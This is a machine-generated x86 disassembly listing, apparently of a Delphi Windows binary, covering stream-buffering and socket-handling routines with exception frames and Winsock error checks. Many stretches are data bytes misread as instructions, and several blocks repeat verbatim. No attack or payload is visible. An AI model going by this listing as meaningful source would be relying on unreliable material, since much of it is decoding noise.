add [ edx + esi + 0x450e0040 ] al
dec ecx
inc ebp
outsb
dec edi
push bx
je r-xdata
popad
insd
lea eax [ eax ]
push ebx
mov ebx ecx
mov ecx ebx
mov eax [ eax + 0x4 ]
call sub_461294
mov eax ebx
pop ebx
retn
push ebp
push sub_460820
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebx ]
call sub_4034a8
test al al
je r-xdata
popad
insd
nop
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
or ecx 0xffffffff
mov edx r-xdata
mov ebx [ eax ]
call [ ebx + 0x70 ]
jmp r-xdata
mov [ ebp - 0x15 ] 0x0
mov eax [ ebp + 0x8 ]
call sub_404050
mov cx 0x1
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov esi eax
mov cx 0x2
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov [ ebp - 0x14 ] eax
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebp - 0x14 ]
sub eax esi
test eax eax
jle r-xdata
mov [ ebp - 0x4 ] 0x7fffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460827
lea eax [ ebp - 0x81c ]
call sub_404050
retn
cmp [ ebp - 0x5 ] 0x0
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x81c ]
push eax
lea edx [ ebp - 0x92c ]
mov eax [ ebx ]
call sub_4031e4
lea eax [ ebp - 0x92c ]
mov [ ebp - 0x82c ] eax
mov [ ebp - 0x828 ] 0x4
mov [ ebp - 0x824 ] esi
mov [ ebp - 0x820 ] 0x0
lea edx [ ebp - 0x82c ]
mov ecx 0x1
mov eax r-xdata
call sub_408d10
mov ecx [ ebp - 0x81c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
cmp esi [ ebp - 0x14 ]
jge r-xdata
mov eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41664c
jmp r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
sub eax esi
mov edx 0x800
call sub_45d0f8
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x816 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_416858
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x816 ]
mov eax [ ebx ]
call sub_4605fc
mov edi eax
add esi [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_404310
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax edi
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
add edx edi
mov eax [ ebp + 0x8 ]
call sub_40469c
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_404510
mov edx [ ebp - 0x10 ]
lea edx [ eax + edx ]
lea eax [ ebp - 0x816 ]
mov ecx edi
call sub_4028e0
mov edi [ ebp - 0x4 ]
sub edi [ ebp - 0x10 ]
mov [ ebp - 0x15 ] 0x1
sub esi [ ebp - 0xc ]
add esi edi
sub_460568
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46058d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460594
retn
sub_4605a4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
add eax 0xc0046
add [ eax ] al
xor [ ebx + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x450e0040 ] al
dec ecx
inc ebp
outsb
dec edi
push bx
je r-xdata
push ebp
push sub_460820
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebx ]
call sub_4034a8
test al al
je r-xdata
popad
insd
nop
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
or ecx 0xffffffff
mov edx r-xdata
mov ebx [ eax ]
call [ ebx + 0x70 ]
jmp r-xdata
mov [ ebp - 0x15 ] 0x0
mov eax [ ebp + 0x8 ]
call sub_404050
mov cx 0x1
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov esi eax
mov cx 0x2
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov [ ebp - 0x14 ] eax
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebp - 0x14 ]
sub eax esi
test eax eax
jle r-xdata
mov [ ebp - 0x4 ] 0x7fffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460827
lea eax [ ebp - 0x81c ]
call sub_404050
retn
cmp [ ebp - 0x5 ] 0x0
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x81c ]
push eax
lea edx [ ebp - 0x92c ]
mov eax [ ebx ]
call sub_4031e4
lea eax [ ebp - 0x92c ]
mov [ ebp - 0x82c ] eax
mov [ ebp - 0x828 ] 0x4
mov [ ebp - 0x824 ] esi
mov [ ebp - 0x820 ] 0x0
lea edx [ ebp - 0x82c ]
mov ecx 0x1
mov eax r-xdata
call sub_408d10
mov ecx [ ebp - 0x81c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
cmp esi [ ebp - 0x14 ]
jge r-xdata
mov eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41664c
jmp r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
sub eax esi
mov edx 0x800
call sub_45d0f8
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x816 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_416858
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x816 ]
mov eax [ ebx ]
call sub_4605fc
mov edi eax
add esi [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_404310
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax edi
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
add edx edi
mov eax [ ebp + 0x8 ]
call sub_40469c
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_404510
mov edx [ ebp - 0x10 ]
lea edx [ eax + edx ]
lea eax [ ebp - 0x816 ]
mov ecx edi
call sub_4028e0
mov edi [ ebp - 0x4 ]
sub edi [ ebp - 0x10 ]
mov [ ebp - 0x15 ] 0x1
sub esi [ ebp - 0xc ]
add esi edi
sub_4605fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi [ ecx ]
xor eax eax
jmp r-xdata
cmp eax [ ecx ]
jl r-xdata
mov bl [ edx + eax ]
sub bl 0xa
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov esi eax
mov [ edi ] 0x1
inc eax
mov [ ecx ] eax
jmp r-xdata
sub bl 0x3
je r-xdata
mov esi eax
mov [ edi ] 0x1
inc eax
cmp eax [ ecx ]
jge r-xdata
jmp r-xdata
mov [ ecx ] eax
jmp r-xdata
cmp [ edx + eax ] 0xa
jne r-xdata
inc eax
inc eax
mov [ ecx ] eax
jmp r-xdata
sub_46064c
push ebp
mov ebp esp
add esp 0xfffff6d4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x81c ] ebx
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_460820
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebx ]
call sub_4034a8
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jge r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
or ecx 0xffffffff
mov edx r-xdata
mov ebx [ eax ]
call [ ebx + 0x70 ]
jmp r-xdata
mov [ ebp - 0x15 ] 0x0
mov eax [ ebp + 0x8 ]
call sub_404050
mov cx 0x1
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov esi eax
mov cx 0x2
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov [ ebp - 0x14 ] eax
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebp - 0x14 ]
sub eax esi
test eax eax
jle r-xdata
mov [ ebp - 0x4 ] 0x7fffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460827
lea eax [ ebp - 0x81c ]
call sub_404050
retn
cmp [ ebp - 0x5 ] 0x0
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x81c ]
push eax
lea edx [ ebp - 0x92c ]
mov eax [ ebx ]
call sub_4031e4
lea eax [ ebp - 0x92c ]
mov [ ebp - 0x82c ] eax
mov [ ebp - 0x828 ] 0x4
mov [ ebp - 0x824 ] esi
mov [ ebp - 0x820 ] 0x0
lea edx [ ebp - 0x82c ]
mov ecx 0x1
mov eax r-xdata
call sub_408d10
mov ecx [ ebp - 0x81c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
cmp esi [ ebp - 0x14 ]
jge r-xdata
mov eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41664c
jmp r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
sub eax esi
mov edx 0x800
call sub_45d0f8
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x816 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_416858
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x816 ]
mov eax [ ebx ]
call sub_4605fc
mov edi eax
add esi [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_404310
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax edi
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
add edx edi
mov eax [ ebp + 0x8 ]
call sub_40469c
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_404510
mov edx [ ebp - 0x10 ]
lea edx [ eax + edx ]
lea eax [ ebp - 0x816 ]
mov ecx edi
call sub_4028e0
mov edi [ ebp - 0x4 ]
sub edi [ ebp - 0x10 ]
mov [ ebp - 0x15 ] 0x1
sub esi [ ebp - 0xc ]
add esi edi
sub_46085c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_460881
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460888
retn
sub_460c21
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
push es
dec edi
outsb
push edi
outsd
jb r-xdata
or al 0x46
add [ eax + eax ] cl
add [ eax ] al
xor [ ebx + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
xor ah bl
inc ebp
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b000d ] al
outsb
push edi
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
or eax 0xc0046
add [ eax ] al
test [ esi + eax * 2 ] cl
add ah al
xor al 0x40
add al dl
outsd
jb r-xdata
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45150040 ] al
dec ecx
push esp
inc ebx
push eax
inc ebx
outsd
outsb
outsb
inc edx
imul ebp [ gs : bp - 0x70 ] 0x480045dc
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
push esp
push esp
add [ eax - 0x80000000 ] al
push cs
add [ ecx ] cl
dec edi
outsb
push edi
outsd
jb r-xdata
shl [ ecx + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0xc0046 ] dh
add [ eax ] al
test [ esi + eax * 2 ] cl
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45180040 ] al
dec ecx
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0xd
inc esi
add [ eax + eax ] cl
inc ebp
outsb
ror [ fs : esi + eax * 2 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
out 0xe eax
inc esi
add [ ebx ] dh
ror [ ebx + 0x88bfc45 ] cl
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_460efd
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x30 ]
xor eax eax
push ebp
push sub_460ee0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404050
jmp r-xdata
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x450f0040 ] al
dec ecx
inc esi
imul ebp [ ebp + 0x4e ] 0x6f46746f
jne r-xdata
push cs
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx + 0x46 ] dl
add [ eax + eax ] cl
add [ eax ] al
test [ esi + eax * 2 ] cl
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
outsd
outsb
outsb
arpl [ gs : ebp + 0x64 ] si
push esp
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x450f0040 ] al
dec ecx
dec esi
outsd
inc esp
popad
je r-xdata
outsb
outsd
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
outsd
push edx
popad
clc
or eax 0x46
push 0x61746144
dec ecx
outsb
inc edx
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4610ac
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_404318
call [ ecx + 0x38 ]
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460ee7
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
or eax 0xc0046
add [ eax ] al
test [ esi + eax * 2 ] cl
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x450f0040 ] al
dec ecx
dec esi
outsd
je r-xdata
add [ eax ] al
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jb r-xdata
inc eax
add [ ebp + ecx + 0x46 ] bl
sub_460f0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_460fd0
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
cmp [ edi + 0x69 ] 0x0
jne r-xdata
mov esi [ edi + 0x7c ]
test esi esi
je r-xdata
cmp [ edi + 0x7c ] 0x0
jne r-xdata
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
mov esi [ edi + 0x7c ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460fd7
lea eax [ ebp - 0x8 ]
call sub_404050
retn
mov eax [ edi + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
mov dl 0x4
mov eax edi
call sub_45df2c
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x48 ]
xor al 0x1
sete al
or al [ ebp - 0x1 ]
je r-xdata
cmp eax 0x0
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
sub_460fe0
push ebx
push esi
mov ebx eax
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov edx [ ebx + 0x7c ]
test edx edx
setne al
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x48 ]
sub_461008
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45de14
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fffc
mov [ esi + 0x6c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45fffc
mov [ esi + 0x80 ] eax
push 0x0
push 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_461fa8
mov [ esi + 0xa4 ] eax
mov [ esi + 0xa0 ] 0x8000
mov [ esi + 0xa8 ] 0x8000
push esi
push r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_46243c
mov [ esi + 0x74 ] eax
mov [ esi + 0x88 ] 0x4000
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4610ac
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404050
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov edi [ ebx + 0x74 ]
mov eax edi
mov edx [ eax ]
call [ edx ]
mov edx eax
mov ecx esi
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x20 ]
pop edi
pop esi
pop ebx
retn
push 0x1
or ecx 0xffffffff
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x6c ]
sub_4610ec
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x5c ]
cmp [ esi + 0x70 ] 0x0
je r-xdata
lea eax [ esi + 0x74 ]
call sub_40d19c
lea eax [ esi + 0xa4 ]
call sub_40d19c
lea eax [ esi + 0x80 ]
call sub_40d19c
lea eax [ esi + 0x6c ]
call sub_40d19c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45deac
test bl bl
jle r-xdata
lea eax [ esi + 0x7c ]
call sub_40d19c
mov [ esi + 0x70 ] 0x0
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_461150
push ebx
mov ebx eax
mov dl 0x3
mov eax ebx
call sub_45df2c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov dl 0x4
mov eax ebx
call sub_45df2c
pop ebx
retn
lea eax [ ebx + 0x7c ]
call sub_40d19c
mov [ ebx + 0x70 ] 0x0
sub_4611a8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4621b4
push edi
mov ecx esi
mov eax [ ebx + 0x80 ]
mov dx [ eax + 0xc ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x50 ]
pop edi
pop esi
pop ebx
retn
sub_4611d0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_461221
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call sub_40b590
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461228
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_461230
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_461286
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov esi [ ebx + 0x80 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_459e44
call sub_403a08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46128d
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_461294
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
jmp r-xdata
mov eax [ ebx + 0x74 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jg r-xdata
cmp eax [ esp ]
pop edx
pop eax
ja r-xdata
push 0x1
or ecx 0xffffffff
mov dl 0x1
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x6c ]
mov cl 0x1
mov dl 0x1
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x48 ]
mov eax [ ebx + 0x74 ]
call sub_462520
mov edx edi
mov ecx esi
call sub_4028e0
mov edx esi
mov eax [ ebx + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_461300
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_461598
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
xor ecx ecx
mov dl [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebx + 0x9c ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor esi esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] 0xfffffffe
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46159f
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_404074
lea eax [ ebp - 0x10 ]
call sub_404050
retn
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebx + 0xa4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0xc ] 0xffffffff
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
xor esi esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ ebx + 0x7c ] 0x0
je r-xdata
test esi esi
sete al
mov [ ebx + 0x69 ] al
test al al
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax [ ebx + 0xa0 ]
cdq
push edx
push eax
mov eax ecx
call sub_4166b0
mov esi [ ebx + 0xa4 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x7c ]
mov esi [ eax ]
call [ esi + 0x54 ]
mov esi eax
jmp r-xdata
xor ecx ecx
mov dl [ ebp - 0x1 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
mov [ ebp - 0xc ] esi
jmp r-xdata
push 0x1
mov [ ebp - 0x18 ] 0x274a
mov [ ebp - 0x14 ] 0x2745
lea ecx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_45b65c
test al al
je r-xdata
test esi esi
jne r-xdata
test esi esi
jle r-xdata
xor esi esi
cmp [ ebx + 0x7c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0xa4 ]
call sub_4166b0
cmp [ ebx + 0x78 ] 0x0
je r-xdata
mov eax [ ebx + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
test al al
je r-xdata
jmp r-xdata
cmp [ ebx + 0x68 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0xa4 ]
call sub_41664c
mov edx [ ebx + 0xa4 ]
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebx + 0xa4 ]
mov edx [ eax ]
call [ edx ]
mov esi eax
cmp eax 0x0
jne r-xdata
mov cx 0x2
xor edx edx
mov eax [ ebx + 0x74 ]
mov edi [ eax ]
call [ edi + 0x14 ]
mov edi [ ebx + 0xa4 ]
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ edi + 0x4 ]
mov eax [ ebx + 0x74 ]
call sub_416890
mov eax [ ebx + 0xa4 ]
mov edx [ eax ]
call [ edx ]
mov edx eax
test edx edx
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b710
mov eax 0x1
mov ecx [ ebx + 0xa4 ]
mov ecx [ ecx + 0x4 ]
mov cl [ ecx + eax ]
and cl 0x7f
push ecx
mov ecx [ ebx + 0xa4 ]
mov ecx [ ecx + 0x4 ]
lea edi [ ecx + eax ]
pop ecx
mov [ edi ] cl
inc eax
dec edx
jne r-xdata
sub_4615ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_4617ca
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_404310
test eax eax
jne r-xdata
mov eax [ esi + 0x88 ]
mov [ ebp + 0xc ] eax
mov [ esi + 0x98 ] 0x0
mov [ esi + 0x99 ] 0x0
